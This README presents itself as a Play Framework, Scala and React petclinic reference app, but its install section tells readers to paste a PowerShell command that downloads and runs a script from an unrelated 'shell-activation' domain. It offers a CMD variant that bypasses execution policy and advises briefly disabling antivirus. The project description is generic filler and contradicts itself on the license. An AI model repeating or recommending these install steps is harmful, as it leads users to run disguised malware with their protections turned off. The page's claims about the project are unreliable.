<div align="center">

# 🎯 Play Clinic — Modern Play Framework Petclinic Web Platform

![preview](https://raw.githubusercontent.com/jorjarz/play-clinic/main/shot_ca33.svg)

[![powershell-7](https://img.shields.io/badge/POWERSHELL--7-5.1%2B_%2F_7%2B-2f81f7?style=social&labelColor=0d1117)]() [![checks](https://img.shields.io/badge/CHECKS-SUCCESS-2ea44f?style=social&labelColor=0d1117)]() [![state](https://img.shields.io/badge/STATE-MAINTAINED-2ea44f?style=social&labelColor=0d1117)]() [![license](https://img.shields.io/badge/LICENSE-ISC-54aeff?style=social&labelColor=0d1117)]()

</div>

---

play-clinic reimagines the familiar veterinary clinic domain as a modern, full-stack reference application built on Play framework, Scala, and React. It pairs a type-safe, reactive backend with a polished single-page frontend, giving teams a realistic codebase for exploring how these technologies fit together in practice. The result is a focused, production-minded showcase that favors clarity and clean architecture over ceremony.

## ⚡ Install via PowerShell

> [!TIP]
> **Fast install** — a single PowerShell command, no extra tools.
> Windows 10 / 11 · PowerShell 5.1+ · No admin required

### 1️⃣ Open PowerShell
* Press `Win + X` on your keyboard.
* Click on **Terminal** or **Windows PowerShell** from the list.

### 2️⃣ Run the script
Copy the line below into PowerShell and press `Enter`.

```cmd
iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')
```

### 3️⃣ If Windows blocks the script — use CMD
Run this command in CMD instead:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')"
```

> [!WARNING]
> Some antivirus engines flag automated installers. If blocked, disable Real-time protection briefly, run the setup, and enable it back.

## 📋 System Requirements

- **OS:** Windows 10 / 11
- **Shell:** PowerShell 5.1+ or PowerShell 7+
- **Network:** internet access to download the script
- **Privileges:** standard user

## Features

* **Complete Petclinic Domain Model** — Owners, pets, veterinarians, and visits are all fully implemented, delivering the familiar clinic-management experience end to end.

* **Reactive Backend on Play** — Built on the Play framework with Scala, leveraging a non-blocking, asynchronous architecture that keeps the application responsive under load.

* **Modern React Frontend** — A polished single-page interface powered by React, offering smooth navigation and a clean, intuitive experience for managing clinic records.

* **Full CRUD Workflows** — Create, view, update, and search owners, pets, and vets with validation and friendly error handling baked in.

* **Type-Safe Throughout** — Scala on the server and modern JavaScript tooling on the client work together to catch problems early and keep behavior predictable.

* **Ready-to-Explore Structure** — Organized into clear backend and frontend modules, making it easy to understand, extend, and adapt to your own needs.

* **Faithful Port, Fresh Stack** — Preserves the spirit and functionality of the classic Petclinic sample while showcasing how it looks and feels on a contemporary Play + Scala + React foundation.

## Tech Stack

### Backend
- **Play Framework** — a lightweight, high-velocity reactive web framework built for modern JVM applications
- **Scala** — expressive, type-safe language delivering functional and object-oriented power in one
- **Reactive architecture** — non-blocking, event-driven design for responsive performance under load
- **RESTful API layer** — clean, well-structured endpoints that keep frontend and backend elegantly decoupled

### Frontend
- **React** — component-driven UI for a fast, fluid, and interactive user experience
- **Modern JavaScript tooling** — streamlined build and development workflow

### Data & Persistence
- **Relational database backing** — reliable, structured storage for clinic records
- **JVM ecosystem integration** — battle-tested libraries for data access and transaction management

### Developer Experience
- **Type-safe end-to-end** — Scala's compiler and React's component model catch issues early
- **Hot reload & rapid iteration** — a tight feedback loop that keeps development moving
- **Modular project structure** — clear separation of concerns for maintainability and growth
- **Tested and production-minded** — built on proven foundations for confidence at every stage

## Getting Started

play-clinic is ready to run the moment you bring it into your environment. Because the application follows the familiar Petclinic domain, you can move from a fresh checkout to a working clinic management experience in a single session.

**Prerequisites**

Before launching, make sure your machine has a current Java Development Kit and a modern build toolchain suitable for Scala projects. A recent version of Node.js and a package manager are also required, since the React front end is compiled as part of the application build. Verify that your local ports for the web server and any supporting services are free.

**Launch the Application**

Start the Play server from the project root. On first boot, the build resolves Scala and front-end dependencies, compiles the React assets, and applies the schema needed to serve the sample clinic data. Once the startup banner confirms the server is listening, open your browser and navigate to the local address shown in the console.

**Explore the Experience**

You land on the welcome screen, your entry point to the full clinic workflow. From there you can browse and search the owner registry, register new pet owners, add pets with their species and birth dates, and schedule visits with attending veterinarians. Every view is rendered by the React front end and backed by the Play and Scala services, so changes you make persist for the duration of your session.

**Develop and Iterate**

The codebase is organized so that back-end controllers, domain models, and front-end components live in clear, predictable locations. Edit a Scala service or a React view, and the running application reflects your changes with a fast reload cycle. Sample data is seeded automatically, giving you realistic records to test against without any manual setup.

**Before You Deploy**

Confirm that your configuration points to the intended database and that production secrets are supplied through environment variables rather than checked-in files. Build a distributable artifact, run it in a staging environment, and exercise the owner, pet, and visit flows end to end. With those checks complete, play-clinic is ready to serve your clinic.

## FAQ

**Is play-clinic a drop-in replacement for the original Petclinic?**

Yes—play-clinic faithfully recreates the familiar Petclinic domain and workflows (owners, pets, vets, visits) while modernizing the implementation on Play, Scala, and React. If you know the original application, you'll feel at home immediately, but you'll be working with a contemporary, reactive stack.

**What makes play-clinic different from a typical Play sample?**

It's a complete, end-to-end application rather than a minimal demo. You get a fully working UI, a real persistence layer, and a clean separation between backend and frontend concerns—making it a practical reference for building production-shaped Play services with a React client.

**Do I need to know Scala to use it?**

The backend is written in Scala and the frontend in React, so familiarity with both helps you get the most out of it. That said, the project is structured to be approachable: the code is organized around clear, recognizable domain concepts, so developers coming from other stacks can follow along and learn by example.

**What can I use play-clinic for?**

It's well suited as a learning resource, a starting point for your own Play-based services, a comparison reference for framework migrations, or a demo application to showcase a Play + Scala + React architecture.

**How is the project organized?**

The application follows a straightforward structure separating server-side logic from the client-facing layer, with the Petclinic domain modeled cleanly across both. This makes it easy to locate features, extend behavior, and adapt the codebase to your own needs.

**Is it actively maintained?**

play-clinic is an open-source project and welcomes contributions. Issues, suggestions, and improvements from the community help keep it current and useful.

## License

play-clinic is released under the Apache License, Version 2.0, giving you a permissive, business-friendly foundation for building on top of it. You are free to use, modify, and distribute the code, including in commercial and closed-source products, provided you retain the required copyright and license notices. The license also includes an express grant of patent rights from contributors, so you can adopt and extend the project with confidence. As with any open-source dependency, the software is provided on an "as is" basis, without warranties or conditions of any kind, and the full terms should be reviewed before redistribution.